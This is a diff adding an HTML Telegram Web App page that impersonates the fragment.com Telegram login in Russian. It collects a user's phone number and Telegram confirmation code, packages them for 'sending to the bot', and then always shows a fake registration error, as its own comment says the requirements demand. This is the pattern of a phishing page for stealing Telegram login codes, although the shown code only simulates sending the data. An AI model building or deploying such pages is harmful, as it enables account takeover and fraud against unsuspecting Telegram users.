@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fragment</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: white;
+            color: #000;
+            line-height: 1.4;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-top: 20px;
+        }
+        
+        .header h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        .phone-section {
+            margin-bottom: 30px;
+        }
+        
+        .country-selector {
+            background: #f8f9fa;
+            border: 1px solid #e1e5e9;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
+        
+        .country-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .flag {
+            font-size: 20px;
+        }
+        
+        .country-name {
+            font-weight: 500;
+        }
+        
+        .arrow {
+            color: #999;
+        }
+        
+        .phone-input {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .country-code {
+            padding: 15px;
+            background: #f8f9fa;
+            border: 1px solid #e1e5e9;
+            border-radius: 12px;
+            min-width: 80px;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .phone-field {
+            flex: 1;
+            padding: 15px;
+            border: 1px solid #e1e5e9;
+            border-radius: 12px;
+            font-size: 16px;
+        }
+        
+        .phone-field:focus {
+            outline: none;
+            border-color: #0088cc;
+        }
+        
+        .buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-cancel {
+            background: #f8f9fa;
+            color: #0088cc;
+        }
+        
+        .btn-next {
+            background: #0088cc;
+            color: white;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .code-section {
+            display: none;
+        }
+        
+        .code-input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #e1e5e9;
+            border-radius: 12px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 5px;
+            margin-bottom: 20px;
+        }
+        
+        .code-input:focus {
+            outline: none;
+            border-color: #0088cc;
+        }
+        
+        .error-message {
+            background: #fee;
+            border: 1px solid #fcc;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #c00;
+            text-align: center;
+            display: none;
+        }
+        
+        .loading {
+            text-align: center;
+            color: #666;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Шаг 1: Ввод телефона -->
+        <div id="stepPhone" class="phone-section">
+            <div class="header">
+                <h1>Войдите, чтобы использовать аккаунт Telegram</h1>
+                <p>для fragment.com и Fragment Auction Alerts.<br>
+                Введите свой <strong>номер телефона</strong> в международном формате. Подтверждение будет отправлено в Telegram.</p>
+            </div>
+            
+            <div class="country-selector">
+                <div class="country-info">
+                    <span class="flag">🇷🇺</span>
+                    <span class="country-name">Россия</span>
+                </div>
+                <span class="arrow">▼</span>
+            </div>
+            
+            <div class="phone-input">
+                <div class="country-code">+7</div>
+                <input type="tel" id="phone" class="phone-field" placeholder="912 345 67 89" maxlength="10">
+            </div>
+            
+            <div class="buttons">
+                <button class="btn btn-cancel" onclick="closeApp()">ОТМЕНА</button>
+                <button class="btn btn-next" onclick="sendPhone()" id="nextBtn">ДАЛЕЕ</button>
+            </div>
+        </div>
+        
+        <!-- Шаг 2: Ввод кода -->
+        <div id="stepCode" class="code-section">
+            <div class="header">
+                <h1>Введите код подтверждения</h1>
+                <p>Код был отправлен в ваши сообщения Telegram</p>
+            </div>
+            
+            <input type="text" id="code" class="code-input" placeholder="12345" maxlength="5">
+            
+            <div class="error-message" id="errorMsg">
+                Ошибка регистрации. Попробуйте еще раз.
+            </div>
+            
+            <div class="buttons">
+                <button class="btn btn-cancel" onclick="backToPhone()">НАЗАД</button>
+                <button class="btn btn-next" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
+            </div>
+        </div>
+        
+        <!-- Загрузка -->
+        <div id="stepLoading" class="loading" style="display: none;">
+            Отправка запроса...
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        let userPhone = '';
+        
+        function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            if (!phone || phone.length < 10) {
+                alert('Введите корректный номер телефона');
+                return;
+            }
+            
+            userPhone = '+7' + phone;
+            
+            // Показываем загрузку
+            document.getElementById('stepPhone').style.display = 'none';
+            document.getElementById('stepLoading').style.display = 'block';
+            
+            // Отправляем номер телефона в бот
+            const data = {
+                action: 'send_phone',
+                phone: userPhone
+            };
+            
+            // Симулируем отправку кода
+            setTimeout(() => {
+                // Переходим к вводу кода
+                document.getElementById('stepLoading').style.display = 'none';
+                document.getElementById('stepCode').style.display = 'block';
+            }, 2000);
+        }
+        
+        function sendCode() {
+            const code = document.getElementById('code').value;
+            if (!code || code.length < 5) {
+                alert('Введите корректный код');
+                return;
+            }
+            
+            // Показываем загрузку
+            document.getElementById('stepCode').style.display = 'none';
+            document.getElementById('stepLoading').style.display = 'block';
+            
+            // Отправляем код в бот
+            const data = {
+                action: 'send_code',
+                phone: userPhone,
+                code: code
+            };
+            
+            // Симулируем обработку кода
+            setTimeout(() => {
+                // Всегда показываем ошибку (как в требованиях)
+                document.getElementById('stepLoading').style.display = 'none';
+                document.getElementById('stepCode').style.display = 'block';
+                document.getElementById('errorMsg').style.display = 'block';
+            }, 3000);
+        }
+        
+        function backToPhone() {
+            document.getElementById('stepCode').style.display = 'none';
+            document.getElementById('stepPhone').style.display = 'block';
+            document.getElementById('errorMsg').style.display = 'none';
+        }
+        
+        function closeApp() {
+            tg.close();
+        }
+        
+        // Обработчики ввода
+        document.getElementById('phone').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+        
+        document.getElementById('code').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+    </script>
+</body>
+</html>
